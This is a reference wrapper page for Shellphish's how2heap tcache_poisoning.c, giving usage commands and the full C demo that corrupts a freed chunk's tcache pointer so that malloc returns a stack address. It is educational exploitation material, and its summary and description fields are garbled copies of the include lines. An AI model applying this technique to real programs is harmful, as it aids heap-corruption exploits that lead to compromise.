---
title: "Tcache Poisoning (how2heap)"
category: "pwn"
subcategory: "heap"
type: "script"
tags: ["how2heap", "tcache-poisoning.c", "tcache", "fastbin", "cache-poisoning", "tcache-poisoning", "pwn"]
summary: "include <stdio.h> include <stdlib.h> include <stdint.h> include <assert.h>"
tools: ["how2heap"]
source:
  name: "shellphish/how2heap"
  url: "https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/tcache_poisoning.c"
license: "MIT"
---

## What it does

include <stdio.h> include <stdlib.h> include <stdint.h> include <assert.h>

## Where it lives

- Vendored locally at `vendor/how2heap/glibc_2.31/tcache_poisoning.c`
- Upstream: <https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.31/tcache_poisoning.c>

## Usage

```bash
# read or run it straight from the vendored copy
$EDITOR vendor/how2heap/glibc_2.31/tcache_poisoning.c
gcc -g -o /tmp/tcache_poisoning vendor/how2heap/glibc_2.31/tcache_poisoning.c && /tmp/tcache_poisoning
```

## Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
		   "returning a pointer to an arbitrary location (in this case, the stack).\n"
		   "The attack is very similar to fastbin corruption attack.\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");

	size_t stack_var;
	printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

	printf("Allocating 2 buffers.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Freeing the buffers...\n");
	free(a);
	free(b);

	printf("Now the tcache list has [ %p -> %p ].\n", b, a);
	printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
	b[0] = (intptr_t)&stack_var;
	printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	printf("We got the control\n");

	assert((long)&stack_var == (long)c);
	return 0;
}

```

## Attribution

- **Author:** Shellphish
- **Repository:** <https://github.com/shellphish/how2heap> (commit `02da6aa26a44`)
- **Licence:** MIT — see `vendor/how2heap/LICENSE`

This file is a wrapper for search and reference. The code is the original authors' work, redistributed unmodified under its own licence.
